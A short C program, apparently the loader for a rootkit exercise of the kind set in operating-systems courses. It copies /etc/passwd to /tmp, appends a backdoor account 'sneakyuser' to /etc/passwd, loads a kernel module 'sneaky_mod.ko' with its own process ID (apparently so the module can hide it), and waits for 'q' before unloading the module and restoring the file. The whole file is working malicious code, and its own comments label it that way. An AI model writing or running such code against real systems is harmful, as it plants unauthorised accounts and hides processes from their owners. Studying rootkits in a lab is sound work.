#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

//Print its own process ID to the screen
void printID(){
  printf("sneaky_process pid = %d\n", getpid());
}

//Do malicious thing to the password
void addLine(){
  system("cp /etc/passwd /tmp");
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
}

//load the sneaky module (sneaky_mod.ko) using the “insmod” command
void load_module() {
    char arg[50];
    sprintf(arg, "insmod sneaky_mod.ko pid=%d", (int)getpid());
    system(arg);
}

//Enter a loop, reading a character at a time from the keyboard input until it receives the character ‘q’ (for quit). 
void input(){
  while (1) {
    if(getchar() == 'q'){
      break;
    }
  }
}

//Unload the sneaky kernel module using the “rmmod” command
void unload(){
  system("rmmod sneaky_mod");
}

//restore the /etc/passwd file
void restore(){
  system("cp /tmp/passwd /etc");
}

int main(int argc, char *argv[]){
  printID();
  addLine();
  load_module();
  input();
  unload();
  restore();
  return EXIT_SUCCESS;
}
